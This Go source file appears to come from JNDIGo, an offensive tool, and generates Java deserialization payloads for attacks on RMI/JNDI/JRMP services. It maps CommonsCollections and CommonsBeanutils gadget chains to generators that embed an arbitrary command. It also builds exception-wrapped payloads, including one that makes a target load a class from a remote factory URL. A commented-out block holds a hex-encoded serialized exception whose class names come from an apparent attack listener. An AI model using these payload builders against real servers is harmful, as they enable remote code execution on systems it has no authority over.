package serialize

import (
	"errors"
	gososerial "github.com/EmYiQing/Gososerial"
	gososerial_gadget "github.com/EmYiQing/Gososerial/ysoserial/gadget"
	"github.com/ekixu/JNDIGo/pkg/serialize/gadget"
)

//func WarpException2(bytePayload []byte) []byte {
//	prefix := "aced0005770f02740aa5050000017eb58a83b380017372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b70787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000070787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b70787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd2239020000707870000000047372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e0005707870000000e974002378797a2e656b692e6a696d2e6e6574776f726b696e672e4a524d504c697374656e65727400114a524d504c697374656e65722e6a617661740006646f43616c6c7371007e000b000000ae71007e000d71007e000e740009646f4d6573736167657371007e000b0000007971007e000d71007e000e74000372756e7371007e000b0000001074002778797a2e656b692e6a696d2e61747461636b2e41747461636b42794a524d504c697374656e657274001941747461636b42794a524d504c697374656e65722e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e0007707872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b707870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65707870000000007704000000007871007e001d78"
//	ser, _ := hex.DecodeString(prefix)
//	var handlerOffset int32
//	handlerOffset = 29
//
//	//add handler offest
//	re1 := regexp.MustCompile(`(?m)\x00\x7e([\x00-\xff]{2})`)
//
//	bytePayload = re1.ReplaceAllFunc(bytePayload, func(matched []byte) []byte {
//		//fmt.Printf("matched:%+v \n", matched)
//		var x int32
//		binary.Read(bytes.NewBuffer(matched), binary.BigEndian, &x)
//
//		x += handlerOffset
//
//		resultBytesBuffer := bytes.NewBuffer([]byte{})
//
//		binary.Write(resultBytesBuffer, binary.BigEndian, x)
//
//		//fmt.Printf("replaced:%+v \n", resultBytesBuffer.Bytes())
//
//		return resultBytesBuffer.Bytes()
//	})
//
//	re2 := regexp.MustCompile("\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b")
//
//	match := re2.Find(bytePayload)
//
//	if match == nil {
//		fmt.Println("not found")
//	}
//
//	bytePayload = re2.ReplaceAll(bytePayload, []byte("\x71\x00\x7e\x00\x01"))
//
//	//remove aced0005 header
//	ser = append(ser, bytePayload[4:]...)
//	fmt.Printf("sending %s\n", hex.EncodeToString(ser))
//	return ser
//}

func GetBytePayload(payload string, command string) ([]byte, error) {
	var bytePayload []byte
	switch payload {
	case gososerial_gadget.CB1:
		bytePayload = gososerial.GetCB1(command)
	case gososerial_gadget.CC1:
		bytePayload = gososerial.GetCC1(command)
	case gososerial_gadget.CC2:
		bytePayload = gososerial.GetCC2(command)
	case gososerial_gadget.CC3:
		bytePayload = gososerial.GetCC3(command)
	case gososerial_gadget.CC4:
		bytePayload = gososerial.GetCC4(command)
	case gososerial_gadget.CC5:
		bytePayload = gososerial.GetCC5(command)
	case gososerial_gadget.CC6:
		bytePayload = gososerial.GetCC6(command)
	case gososerial_gadget.CC7:
		bytePayload = gososerial.GetCC7(command)
	case gososerial_gadget.CCK1:
		bytePayload = gososerial.GetCCK1(command)
	case gososerial_gadget.CCK2:
		bytePayload = gososerial.GetCCK2(command)
	case gososerial_gadget.CCK3:
		bytePayload = gososerial.GetCCK3(command)
	case gososerial_gadget.CCK4:
		bytePayload = gososerial.GetCCK4(command)
	default:
		return nil, errors.New("payload unsupported")
	}
	return bytePayload, nil
}

func GetErrorWrappedBytePayload(payload string, command string) ([]byte, error) {
	var bytePayload []byte
	switch payload {
	case gadget.WCC6:
		bytePayload = gadget.GetJRMPExceptionWrappedCC6(command)
	default:
		return nil, errors.New("payload unsupported")
	}
	return bytePayload, nil
}

func GetJRMPExceptionWrappedRemoteFactoryPayload(factoryURL string, classname string) ([]byte, error) {
	return gadget.GetExceptionWrappedRemoteFactoryBytePayload(factoryURL, classname), nil
}

func GetAllRMIPayloadName() []string {
	return []string{
		gadget.WCC6,
	}
}
